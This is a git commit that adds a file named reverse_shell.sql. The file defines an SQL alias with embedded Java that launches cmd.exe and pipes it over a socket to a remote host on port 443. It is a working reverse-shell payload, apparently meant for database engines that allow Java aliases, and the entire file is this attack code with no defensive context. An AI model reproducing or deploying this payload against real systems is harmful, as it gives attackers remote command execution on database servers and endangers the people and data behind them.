78461ac0e2ba7f5b786b7693b20a744025334440
Aravazhi MDR <aravazhimdr@gmail.com>
2020-06-22 17:02:15 +0530

    Create reverse_shell.sql

---
+++ reverse_shell.sql
@@ -0,0 +1,7 @@
+CREATE ALIAS REVSHELL AS $$ String retint(String host) throws java.io.IOException, java.lang.InterruptedException {
+int port=443;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+return "Exit";
+}
+$$
